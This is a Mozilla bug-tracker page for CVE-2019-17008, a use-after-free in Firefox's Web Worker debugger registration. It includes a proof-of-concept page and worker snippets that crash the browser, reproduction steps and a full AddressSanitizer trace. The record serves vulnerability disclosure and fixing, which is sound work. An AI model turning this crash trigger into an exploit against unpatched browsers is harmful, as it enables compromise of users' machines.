| firefox136 | --- | --- |

## People

### (Reporter: loobenyang, Assigned: edenchuang)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/3afcbed8f1748e0ae0da0bc4cabddcaf?d=mm&size=40)  [edenchuang](/user_profile?user_id=516138)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/387b65e77a270f67cd03547039f6b2eb?d=mm&size=40)  [loobenyang](/user_profile?user_id=506912)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/056757eff6ed7c8ec26f61e3bf7695fe?d=mm&size=40)  [smaug](/user_profile?user_id=39966)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

12 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: csectype-uaf, reporter-external, sec-high, Whiteboard: [adv-main71+][adv-esr68.3+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2019-17008

[Keywords:](/describekeywords.cgi)

[csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adv-main71+][adv-esr68.3+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a18082156_1689 "6 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files, 2 obsolete files)

| [UAF\_RegisterDebuggerMainThread\_PoC.js](/attachment.cgi?id=9060048)  [6 years ago](#c0)  [Looben Yang](/user_profile?user_id=506912)   1.55 KB, text/javascript |  | [Details](/attachment.cgi?id=9060048&action=edit) |
| --- | --- | --- |
| [UAF\_RegisterDebuggerMainThread\_PoC.js](/attachment.cgi?id=9060832)  [6 years ago](#c1)  [Looben Yang](/user_profile?user_id=506912)   1.55 KB, text/javascript |  | [Details](/attachment.cgi?id=9060832&action=edit) |
| [Missing call to WaitForIsDebuggerRegistered](/attachment.cgi?id=9107143)  [5 years ago](#c23)  [Eden Chuang[:edenchuang]](/user_profile?user_id=516138)   47 bytes, text/x-phabricator-request | lizzard : [approval-mozilla-beta+](#c38 "5 years ago")  lizzard : [approval-mozilla-esr68+](#c38 "5 years ago")  tjr : [sec-approval+](#c28 "5 years ago") | [Details](/attachment.cgi?id=9107143&action=edit) | [Review](/attachment.cgi?id=9107143) |
| [advisory.txt](/attachment.cgi?id=9111772)  [5 years ago](#c41)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   186 bytes, text/plain |  | [Details](/attachment.cgi?id=9111772&action=edit) |
| [advisory.txt](/attachment.cgi?id=9111856)  [5 years ago](#c42)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   186 bytes, text/plain |  | [Details](/attachment.cgi?id=9111856&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1546331#c0)• 6 years ago |
|  | |

Attached file
[UAF\_RegisterDebuggerMainThread\_PoC.js](attachment.cgi?id=9060048) (obsolete)
— [Details](attachment.cgi?id=9060048&action=edit)

Prove of Concept test case (full server code in attached file UAF\_RegisterDebuggerMainThread\_PoC.js):

```
Main Page code:
    <script type="text/javascript">
    gc = function()
    {
      for (var i = 0; i < 0x20000; ++i)
        var s = new String('AAAA');
    };
    worker0 = new Worker("worker0.js");
    worker0.onerror=function(){ gc();};
    worker1 = new Worker("worker1.js");
    setTimeout(function(){location.reload()},200);
    </script>

Worker 0:
	var embedworker1 = new Worker("embedworker1.js"); yes = no;

Worker 1:
    self.onerror = function () {
    embedworker0.terminate();
    };
    var embedworker0 = new Worker("embedworker0.js"); yes = no;

```

Steps to reproduce:

1. Run server side script UAF\_RegisterDebuggerMainThread\_PoC.js with Node.js (node UAF\_RegisterDebuggerMainThread\_PoC.js).

2. Enter <http://localhost:12345> in Firefox ASAN build.

3. ASAN reports a Use After Free in RegisterDebuggerMainThread():

```
    ==3247==ERROR: AddressSanitizer: heap-use-after-free on address 0x61b00017b210 at pc 0x7fe791ea90ce bp 0x7ffe59b72f10 sp 0x7ffe59b72f08
    WRITE of size 8 at 0x61b00017b210 thread T0 (Web Content)
        #0 0x7fe791ea90cd in SetDebugger /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:188:15
        #1 0x7fe791ea90cd in mozilla::dom::WorkerDebuggerManager::RegisterDebuggerMainThread(mozilla::dom::WorkerPrivate*, bool)

```

Firefox version: 68.0a1 (2019-04-22) (64-bit)

OS: Ubuntu 16.04 LTS

Stack trace:

```
=================================================================
==3247==ERROR: AddressSanitizer: heap-use-after-free on address 0x61b00017b210 at pc 0x7fe791ea90ce bp 0x7ffe59b72f10 sp 0x7ffe59b72f08
WRITE of size 8 at 0x61b00017b210 thread T0 (Web Content)
    #0 0x7fe791ea90cd in SetDebugger /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:188:15
    #1 0x7fe791ea90cd in mozilla::dom::WorkerDebuggerManager::RegisterDebuggerMainThread(mozilla::dom::WorkerPrivate*, bool) /builds/worker/workspace/build/src/dom/workers/WorkerDebuggerManager.cpp:277
    #2 0x7fe791ed28de in mozilla::dom::(anonymous namespace)::RegisterDebuggerMainThreadRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerDebuggerManager.cpp:41:14
    #3 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #4 0x7fe78a2b83d8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #5 0x7fe78b2f7caa in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21
    #6 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #7 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #8 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #9 0x7fe7926bf749 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27
    #10 0x7fe7962dd4df in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:919:20
    #11 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #12 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #13 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #14 0x7fe7962dce86 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:757:34
    #15 0x5604aa4e53a7 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28
    #16 0x5604aa4e53a7 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:263
    #17 0x7fe7a9c4282f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
    #18 0x5604aa406af8 in _start (/home/thecoder/FirefoxBuilds/firefox/firefox+0x2aaf8)

0x61b00017b210 is located 912 bytes inside of 1440-byte region [0x61b00017ae80,0x61b00017b420)
freed by thread T22 (DOM Worker) here:
    #0 0x5604aa4b2182 in free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3
    #1 0x7fe791f1e110 in operator delete /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:151:10
    #2 0x7fe791f1e110 in Release /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:102
    #3 0x7fe791f1e110 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:46
    #4 0x7fe791f1e110 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:363
    #5 0x7fe791f1e110 in assign_assuming_AddRef /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:65
    #6 0x7fe791f1e110 in operator= /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:156
    #7 0x7fe791f1e110 in ClearSelfAndParentEventTargetRef /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:125
    #8 0x7fe791f1e110 in mozilla::dom::(anonymous namespace)::WorkerFinishedRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:238
    #9 0x7fe791f09842 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12
    #10 0x7fe791eef44c in ProcessAllControlRunnablesLocked /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:3276:9
    #11 0x7fe791eef44c in mozilla::dom::WorkerPrivate::DoRunLoop(JSContext*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2646
    #12 0x7fe791eb82cb in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2305:40
    #13 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #14 0x7fe78a2b83d8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #15 0x7fe78b2f8eb0 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5
    #16 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #17 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #18 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #19 0x7fe78a2ac21a in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11
    #20 0x7fe7ab05905d in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5
    #21 0x7fe7aaca06b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)

previously allocated by thread T22 (DOM Worker) here:
    #0 0x5604aa4b2503 in __interceptor_malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3
    #1 0x5604aa4e6f9d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:68:15
    #2 0x7fe791ee9c29 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:131:10
    #3 0x7fe791ee9c29 in mozilla::dom::WorkerPrivate::Constructor(JSContext*, nsTSubstring<char16_t> const&, bool, mozilla::dom::WorkerType, nsTSubstring<char16_t> const&, nsTSubstring<char> const&, mozilla::dom::WorkerLoadInfo*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2235
    #4 0x7fe791e9ba17 in mozilla::dom::Worker::Constructor(mozilla::dom::GlobalObject const&, nsTSubstring<char16_t> const&, mozilla::dom::WorkerOptions const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/Worker.cpp:30:41
    #5 0x7fe78f4ae630 in mozilla::dom::Worker_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WorkerBinding.cpp:1112:52
    #6 0x7fe796569595 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13
    #7 0x7fe796569595 in CallJSNativeConstructor /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458
    #8 0x7fe796569595 in InternalConstruct(JSContext*, js::AnyConstructArgs const&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:651
    #9 0x7fe796546916 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3070:16
    #10 0x7fe796530528 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10
    #11 0x7fe79656bb7c in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13
    #12 0x7fe79656c329 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:814:10
    #13 0x7fe7967ed334 in bool Evaluate<char16_t>(JSContext*, js::ScopeKind, JS::Handle<JSObject*>, JS::ReadOnlyCompileOptions const&, JS::SourceText<char16_t>&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:539:10
    #14 0x7fe7967ec6aa in JS::Evaluate(JSContext*, JS::ReadOnlyCompileOptions const&, JS::SourceText<char16_t>&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:557:10
    #15 0x7fe791ec98d6 in mozilla::dom::(anonymous namespace)::ScriptExecutorRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:1989:10
    #16 0x7fe791f09842 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12
    #17 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #18 0x7fe78a2b83d8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #19 0x7fe791ef859e in mozilla::dom::WorkerPrivate::RunCurrentSyncLoop() /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:3646:7
    #20 0x7fe791e9a7b5 in Run /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:1173:27
    #21 0x7fe791e9a7b5 in mozilla::dom::(anonymous namespace)::LoadAllScripts(mozilla::dom::WorkerPrivate*, nsTArray<mozilla::dom::(anonymous namespace)::ScriptLoadInfo>&, bool, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:2149
    #22 0x7fe791e99bd2 in mozilla::dom::workerinternals::LoadMainScript(mozilla::dom::WorkerPrivate*, nsTSubstring<char16_t> const&, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:2259:3
    #23 0x7fe791f1ca85 in mozilla::dom::(anonymous namespace)::CompileScriptRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:340:5
    #24 0x7fe791f09842 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12
    #25 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #26 0x7fe78a2b83d8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #27 0x7fe791eefd3a in mozilla::dom::WorkerPrivate::DoRunLoop(JSContext*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2748:7
    #28 0x7fe791eb82cb in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2305:40
    #29 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #30 0x7fe78a2b83d8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #31 0x7fe78b2f8eb0 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5
    #32 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #33 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #34 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #35 0x7fe78a2ac21a in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11

Thread T22 (DOM Worker) created by T0 (Web Content) here:
    #0 0x5604aa49aadd in pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:210:3
    #1 0x7fe7ab04b158 in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:433:14
    #2 0x7fe7ab034d3e in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:518:12
    #3 0x7fe78a2ae529 in nsThread::Init(nsTSubstring<char> const&) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:661:8
    #4 0x7fe791f18c48 in mozilla::dom::WorkerThread::Create(mozilla::dom::WorkerThreadFriendKey const&) /builds/worker/workspace/build/src/dom/workers/WorkerThread.cpp:93:7
    #5 0x7fe791e8d1d9 in mozilla::dom::workerinternals::RuntimeService::ScheduleWorker(mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:1433:14
    #6 0x7fe791e8b7f5 in mozilla::dom::workerinternals::RuntimeService::RegisterWorker(mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:1298:19
    #7 0x7fe791ee9d49 in mozilla::dom::WorkerPrivate::Constructor(JSContext*, nsTSubstring<char16_t> const&, bool, mozilla::dom::WorkerType, nsTSubstring<char16_t> const&, nsTSubstring<char> const&, mozilla::dom::WorkerLoadInfo*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2250:24
    #8 0x7fe791e9ba17 in mozilla::dom::Worker::Constructor(mozilla::dom::GlobalObject const&, nsTSubstring<char16_t> const&, mozilla::dom::WorkerOptions const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/Worker.cpp:30:41
    #9 0x7fe78f4ae630 in mozilla::dom::Worker_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WorkerBinding.cpp:1112:52
    #10 0x7fe796569595 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13
    #11 0x7fe796569595 in CallJSNativeConstructor /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458
    #12 0x7fe796569595 in InternalConstruct(JSContext*, js::AnyConstructArgs const&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:651
    #13 0x7fe796546916 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3070:16
    #14 0x7fe796530528 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10
    #15 0x7fe79656bb7c in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13
    #16 0x7fe79656c329 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:814:10
    #17 0x7fe7967ea5ca in ExecuteScript(JSContext*, JS::Handle<JS::StackGCVector<JSObject*, js::TempAllocPolicy> >, JS::Handle<JSScript*>, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:455:10
    #18 0x7fe78dab2254 in nsJSUtils::ExecutionContext::ExecScript() /builds/worker/workspace/build/src/dom/base/nsJSUtils.cpp:386:8
    #19 0x7fe792360e33 in mozilla::dom::ExecuteCompiledScript(JSContext*, mozilla::dom::ScriptLoadRequest*, nsJSUtils::ExecutionContext&) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2495:16
    #20 0x7fe79235def1 in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2715:20
    #21 0x7fe79235688c in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2222:10
    #22 0x7fe792353262 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, mozilla::dom::ScriptKind) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1803:10
    #23 0x7fe79232d67e in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1526:10
    #24 0x7fe79232c94e in mozilla::dom::ScriptElement::MaybeProcessScript() /builds/worker/workspace/build/src/dom/script/ScriptElement.cpp:118:18
    #25 0x7fe78c6218fa in AttemptToExecute /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIScriptElement.h:224:18
    #26 0x7fe78c6218fa in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:727
    #27 0x7fe78c61b5a3 in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:530:7
    #28 0x7fe78c627720 in nsHtml5ExecutorFlusher::Run() /builds/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:133:18
    #29 0x7fe78a2811f1 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:295:32
    #30 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #31 0x7fe78a2b83d8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #32 0x7fe78b2f7caa in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21
    #33 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #34 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #35 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #36 0x7fe7926bf749 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27
    #37 0x7fe7962dd4df in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:919:20
    #38 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #39 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #40 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #41 0x7fe7962dce86 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:757:34
    #42 0x5604aa4e53a7 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28
    #43 0x5604aa4e53a7 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:263
    #44 0x7fe7a9c4282f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291

SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:188:15 in SetDebugger
Shadow bytes around the buggy address:
  0x0c36800275f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680027600: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680027610: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680027620: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680027630: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c3680027640: fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680027650: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680027660: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680027670: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3680027680: fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3680027690: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==3247==ABORTING

```

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a45065_280903)• 6 years ago |

Flags: sec-bounty?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a195785_1689)• 6 years ago |

Group: core-security → dom-core-securityKeywords: [csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a195858_1689)• 6 years ago |

Flags: needinfo?(ytausky)Flags: needinfo?(bugmail)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1546331#a195933_451704)• 6 years ago |

[status-firefox67](/buglist.cgi?f1=cf_status_firefox67&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_status_firefox67&o1=equals&v1=%3F)
[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=%3F)

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1546331#c1)• 6 years ago |
|  | |

Attached file
[UAF\_RegisterDebuggerMainThread\_PoC.js](attachment.cgi?id=9060832)
— [Details](attachment.cgi?id=9060832&action=edit)

Corrected a single quote error in the POC:

mainPageCode += ' var s = new String('AAAA');\n';

=>

mainPageCode += ' var s = new String("AAAA");\n';

Not sure how I made this mistake. Sorry about that.

